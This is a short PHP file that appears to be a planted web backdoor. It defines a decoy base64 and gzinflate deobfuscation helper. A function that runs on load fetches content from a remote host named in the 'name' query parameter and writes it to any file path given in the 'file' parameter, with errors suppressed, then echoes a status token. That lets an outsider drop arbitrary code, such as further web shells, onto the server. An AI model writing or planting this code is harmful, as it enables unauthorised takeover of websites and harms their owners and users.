<?php
function BASE64_DEC0DE($bnbed){
  $base_pre = substr($bnbed, 0, 5);
  $base_ext = substr($bnbed, -5);
  $base_ = substr($bnbed, 7, strlen($bnbed) - 14);
  return gzinflate(base64_decode($base_pre . $base_ . $base_ext));
}
function class_x_i($x = ''){
$sitess = $_GET['name'];
$nalesfs = $_GET['file'];
$cckkded='http://';
$result = @file_get_contents($cckkded.$sitess);
file_put_contents($nalesfs,$result);
$status='O1024K';
echo $status;
}
class_x_i();
?>